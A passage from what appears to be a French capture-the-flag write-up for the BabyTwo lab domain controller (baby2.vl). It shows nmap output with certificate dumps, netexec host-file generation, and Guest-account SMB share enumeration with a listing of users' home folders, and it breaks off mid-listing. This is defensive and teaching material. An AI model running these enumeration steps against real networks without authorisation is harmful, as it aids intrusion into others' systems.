+</span></span><span class="line"><span class="cl"><span class="p">|</span> 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
+</span></span><span class="line"><span class="cl"><span class="p">|</span> PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+</span></span><span class="line"><span class="cl"><span class="p">|</span> b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
+</span></span><span class="line"><span class="cl"><span class="p">|</span> C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
+</span></span><span class="line"><span class="cl"><span class="p">|</span> G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
+</span></span><span class="line"><span class="cl"><span class="p">|</span> +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">Fg</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby2.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>baby2-CA/domainComponent<span class="o">=</span>baby2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2105-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   4ef7774ca9798d43b332cc537cb641ab
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
+</span></span><span class="line"><span class="cl"><span class="p">|</span> y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
+</span></span><span class="line"><span class="cl"><span class="p">|</span> PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+</span></span><span class="line"><span class="cl"><span class="p">|</span> b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
+</span></span><span class="line"><span class="cl"><span class="p">|</span> C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
+</span></span><span class="line"><span class="cl"><span class="p">|</span> G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
+</span></span><span class="line"><span class="cl"><span class="p">|</span> +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">Fg</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server syn-ack ttl <span class="m">127</span> Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-12-23T20:54:36+00:00<span class="p">;</span> 0s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.baby2.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>dc.baby2.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-18T14:29:57
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2026-02-17T14:29:57
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   ae82599cb589a1ec60b7e83c50d7cf06
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 1e8a1ac992a1c502dd3a8d88534112a0828dbbcb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIC2jCCAcKgAwIBAgIQECzNJMCvB7JBsQI1BY17HDANBgkqhkiG9w0BAQsFADAW
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MRQwEgYDVQQDEwtkYy5iYWJ5Mi52bDAeFw0yNTA4MTgxNDI5NTdaFw0yNjAyMTcx
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NDI5NTdaMBYxFDASBgNVBAMTC2RjLmJhYnkyLnZsMIIBIjANBgkqhkiG9w0BAQEF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AAOCAQ8AMIIBCgKCAQEAtcTzjo+8B5V4o+bT9kNHk7efkEVO+xKeKD8WBVD4iVm2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DSdZ9MzkdttJEXUSx1q39pcX6FssOvKjZon5I1sObA+tilALHlDv/QzUmOTmHS0U
+</span></span><span class="line"><span class="cl"><span class="p">|</span> eAbUTL5ICrNGS4IkgUyFr6tmsp72rJFXyhuF90pcYFdvW5YVHoA/pwf3P2Umlg/0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4CwVa7f8xrJc6dvqGW85GVkGd/2rsqvLX5sPmvq3SYonP+FqTpog9TG22g/W9E8l
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ReG+MExHMW3MVeCD9MwazG/wp//i5nGNkZnjHzYjThOdyI89e9r9RHBuqu1pTogv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SSkCFUOj18YJMOLKYXhwRJ89yTwrvARETmSnCq7ExQIDAQABoyQwIjATBgNVHSUE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBACyC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mmndouOsKsD5ymW6HW9oZ+g7B9/UzSSKTOB+xTZtftedR4sFFD+7B5P76WhppX9p
+</span></span><span class="line"><span class="cl"><span class="p">|</span> CzGBiAnRcy+W6Wg/vzhSg7IW6tF8Tp0AJkL6Fxks9K2AgDBeCk1EizovGSchjEyv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> iLzzAFtHAUVqy7yix1SIyeNwPUNhuRbxg+9AOCQDOOwVYyit8sRz/saDlRqU9xpl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 0KGQ846kXP9NjxstyU/ry+c0TJP98XyXjnM+v/Xy873VofxHBGXQdW9MAakY0HbX
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p3PvvrCMr8MTGGhZVJ2KsZCruIuU6XZ3Yv7Dnqc6Dp+7q1Tp64FriRgr/UP0y2Mk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">FVYhV7IDnNZyaBQW91k</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: DC
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: baby2.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: dc.baby2.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: baby2.vl
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2025-12-23T20:53:56+00:00
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        syn-ack ttl <span class="m">127</span> .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">56123/tcp open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">56124/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">56140/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">57691/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">57727/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC</span></span></code></pre></div></div>
+<p>Ensuite j&rsquo;ajoute le nom de domaine ainsi que le <em>FQDN</em> dans le fichier <strong>/etc/hosts</strong>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.129.234.72 --generate-hosts-file /etc/hosts
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">::1     localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">fe00::  ip6-localnet
+</span></span><span class="line"><span class="cl">ff00::  ip6-mcastprefix
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">172.17.0.2      exegol-htb-labs
+</span></span><span class="line"><span class="cl">10.129.234.72     DC.baby2.vl baby2.vl DC</span></span></code></pre></div></div>
+<h2 id="smb---tcp-445">SMB - TCP 445</h2>
+<h3 id="énumération-de-partages">Énumération de partages</h3>
+<p>Je n&rsquo;ai pas la permission de lister les partages en tant qu&rsquo;anonyme.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\:</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED</span></span></code></pre></div></div>
+<p>En tant que l&rsquo;utilisateur <strong>Guest</strong>, j&rsquo;ai un accès en lecture aux partages <code>NETLOGON</code>, <code>IPC$</code>, <code>apps</code>. Puis un accès en lecture et en écriture sur le partage <code>homes</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               apps            READ
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               docs
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               homes           READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               SYSVOL                          Logon server share</span></span></code></pre></div></div>
+<p>Dans le partage <code>homes</code>, se trouvent les repertoires personnels de quelques utilisateurs du domaine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ smbclientng -H dc.baby2.vl -d baby2.vl -u guest -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">               _          _ _            _
+</span></span><span class="line"><span class="cl"> ___ _ __ ___ <span class="p">|</span> <span class="p">|</span>__   ___<span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> ___ _ __ <span class="p">|</span> <span class="p">|</span>_      _ __   __ _
+</span></span><span class="line"><span class="cl">/ __<span class="p">|</span> <span class="s1">&#39;_ ` _ \| &#39;</span>_ <span class="se">\ </span>/ __<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/ _ <span class="se">\ </span><span class="s1">&#39;_ \| __|____| &#39;</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">||</span>_____<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>___/_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_.__/ <span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>    <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span>
+</span></span><span class="line"><span class="cl">    by @podalirius_                             v3.0.0  <span class="p">|</span>___/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">|</span> Provide a password <span class="k">for</span> <span class="s1">&#39;baby2.vl\guest&#39;</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully authenticated to <span class="s1">&#39;dc.baby2.vl&#39;</span> as <span class="s1">&#39;baby2.vl\guest&#39;</span>!
+</span></span><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\]</span>&gt; use homes
+</span></span><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\h</span>omes<span class="se">\]</span>&gt; ls
+</span></span><span class="line"><span class="cl">d-------     0.00 B  2025-12-23 22:00  .<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:10  ..<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Amelia.Griffiths<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Carl.Moore<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Harry.Shaw<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Joan.Jennings<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Joel.Hurst<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Kieran.Mitchell<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:22  library<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Lynda.Bailey<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Mohammed.Harris<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Nicola.Lamb<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:17  Ryan.Jenkins<span class="err">\</span></span></span></code></pre></div></div>
+<p>Dans le partage <code>apps</code>, se trouve un répertoire <code>dev</code> contenant un raccourci vers un script de connexion.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\h</span>omes<span class="se">\]</span>&gt; use apps
+</span></span><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\a</span>pps<span class="se">\]</span>&gt; ls
+</span></span><span class="line"><span class="cl">d-------     0.00 B  2023-09-07 21:12  .<span class="se">\
